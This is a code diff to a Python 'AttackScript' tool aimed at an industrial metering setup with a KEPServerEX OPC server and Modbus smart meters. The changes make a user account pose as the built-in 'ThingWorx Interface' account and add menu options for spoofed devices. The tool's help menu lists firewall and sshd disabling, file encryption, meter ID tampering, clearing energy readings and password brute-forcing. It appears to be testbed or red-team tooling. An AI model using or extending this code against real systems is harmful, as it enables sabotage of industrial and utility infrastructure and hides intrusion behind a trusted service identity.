@@ -22,7 +22,6 @@ import sys
 # from Powershell.callPowerShell import runPowerShellScript
 import paramiko
 import subprocess
-import OpenOPC
 
 
 class AttackScript:
@@ -1020,10 +1019,10 @@ class AttackScript:
     def kep_modify_user(
             self):  ## ADDED to modify user requires three input from user - Description and Usergroup name and user to change
         server = self.kep_connect()
-        print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": "TEST UPDATE",
-                                                          "libadminsettings.USERMANAGER_USER_GROUPNAME": "readtesting"}),
+        print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_NAME": "ThingWorx Interface", "common.ALLTYPES_DESCRIPTION": "Built-in ThingWorx Interface account",
+                                                          "libadminsettings.USERMANAGER_USER_GROUPNAME": "ThingWorx Interface Users"}),
                          indent=4))
-        print(admin.users.get_user(server, "bigboi"))
+        print(admin.users.get_user(server, "Thingworx Interface"))
 
     def kep_add_channel(self):
         server = self.kep_connect()
@@ -1420,15 +1419,25 @@ class AttackScript:
             case "21":
                 self.kep_get_all_channels()
             case "22":
-                self.kep_get_all_devices()
+                self.kep_get_all_devices("Channel1")
             case "23":
-                self.kep_get_single_device()
+                self.kep_get_single_device("SmartMeter", "Meter1")
             case "24":
-                self.kep_delete_spoofed_device()
+                self.kep_delete_spoofed_device("Channel1", "Device1")
             case "25":
-                self.kep_add_spoofed_device()
+                self.kep_add_spoofed_device("SmartMeter", "Meter1")
             case "26":
                 self.kep_add_udd_profile()
+            case "27":
+                self.kep_add_name_resolution("SmartMeter", "Meter1")
+            case "28":
+                self.kep_add_exchange("SmartMeter", "Meter1")
+            case "29":
+                self.kep_modify_user()
+            case "30":
+                self.kep_auto_tag_gen("Channel1", "Device1")
+            case "31":
+                self.kep_add_channel()
             case "-h":
                 print(
                     "\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info, \n26 A.")
